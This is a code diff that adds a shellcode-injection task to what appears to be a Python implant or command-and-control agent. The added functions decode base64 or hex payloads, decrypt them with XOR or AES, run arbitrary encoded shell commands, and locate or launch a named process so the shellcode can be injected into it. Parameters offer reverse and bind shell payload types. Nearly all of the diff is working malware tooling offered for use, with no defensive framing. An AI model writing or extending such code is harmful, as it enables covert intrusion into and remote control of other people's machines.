@@ -4,12 +4,132 @@ import psutil
 from datetime import datetime
 import platform
 import base64
+import binascii
+import subprocess
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+import os
+import time
 
 # Configure logging
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s'
 )
+
+def decode_shellcode(shellcode_str, encoding):
+    try:
+        if encoding == 'base64':
+            return base64.b64decode(shellcode_str)
+        elif encoding == 'hex':
+            return binascii.unhexlify(shellcode_str)
+        elif encoding == 'raw':
+            return shellcode_str.encode() if isinstance(shellcode_str, str) else shellcode_str
+        else:
+            raise ValueError(f'Unsupported encoding: {encoding}')
+    except Exception as e:
+        raise ValueError(f'Error decoding shellcode: {str(e)}')
+
+def xor_decrypt(data, key):
+    key_bytes = key.encode() if isinstance(key, str) else key
+    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])
+
+def aes_decrypt(data, key):
+    key_bytes = key.encode() if isinstance(key, str) else key
+    key_bytes = key_bytes.ljust(32, b'\x00')[:32]
+    iv = data[:16]
+    encrypted = data[16:]
+    cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
+    decrypted = cipher.decrypt(encrypted)
+    return unpad(decrypted, AES.block_size)
+
+def run_command(command):
+    try:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
+        return {
+            'status': 'success',
+            'output': result.stdout,
+            'error': result.stderr,
+            'returncode': result.returncode,
+            'timestamp': datetime.now().isoformat()
+        }
+    except Exception as e:
+        return {
+            'status': 'error',
+            'error': str(e),
+            'timestamp': datetime.now().isoformat()
+        }
+
+def inject_shellcode_task(params):
+    """
+    params: dict with keys:
+        - shellcode: encoded/encrypted shellcode string
+        - encoding: base64/hex/raw
+        - encryption: none/xor/aes
+        - key: encryption key (if any)
+        - type: reverse/bind/exec
+        - command: (for exec) the command to run (may be encoded/encrypted)
+        - process: (for injection) process name
+        - start_if_not_running: bool, whether to start the process if not found
+    """
+    shellcode_str = params.get('shellcode')
+    encoding = params.get('encoding', 'base64')
+    encryption = params.get('encryption', 'none')
+    key = params.get('key', '')
+    payload_type = params.get('type', 'reverse')
+    command = params.get('command', '')
+    process_name = params.get('process', '')
+    start_if_not_running = params.get('start_if_not_running', False)
+
+    # For exec, decode/decrypt the command if needed
+    if payload_type == 'exec' and command:
+        cmd = command
+        if encoding != 'none':
+            cmd = decode_shellcode(cmd, encoding).decode(errors='ignore')
+        if encryption == 'xor' and key:
+            cmd = xor_decrypt(cmd.encode(), key).decode(errors='ignore')
+        elif encryption == 'aes' and key:
+            cmd = aes_decrypt(cmd.encode(), key).decode(errors='ignore')
+        return run_command(cmd)
+
+    # Otherwise, decode and decrypt shellcode
+    shellcode = decode_shellcode(shellcode_str, encoding)
+    if encryption == 'xor' and key:
+        shellcode = xor_decrypt(shellcode, key)
+    elif encryption == 'aes' and key:
+        shellcode = aes_decrypt(shellcode, key)
+
+    # Find process by name
+    target_pid = None
+    for proc in psutil.process_iter(['pid', 'name']):
+        try:
+            if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
+                target_pid = proc.info['pid']
+                break
+        except Exception:
+            continue
+
+    # If not found and start_if_not_running is set, start the process
+    if not target_pid and start_if_not_running and process_name:
+        try:
+            if platform.system().lower() == 'windows':
+                # Start process using shell for system executables
+                p = subprocess.Popen(process_name, shell=True)
+            else:
+                p = subprocess.Popen([process_name])
+            time.sleep(1)  # Give it a moment to start
+            # Re-scan for the process by name
+            for proc in psutil.process_iter(['pid', 'name']):
+                if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
+                    target_pid = proc.info['pid']
+                    break
+        except Exception as e:
+            return {'error': f'Failed to start process {process_name}: {e}', 'status': 'error'}
+
+    if not target_pid:
+        return {'error': f'Process {process_name} not found', 'status': 'error'}
+
+    return inject_shellcode(process_name, base64.b64encode(shellcode).decode())
 
 def validate_shellcode(shellcode_b64):
     """Validate base64 encoded shellcode"""
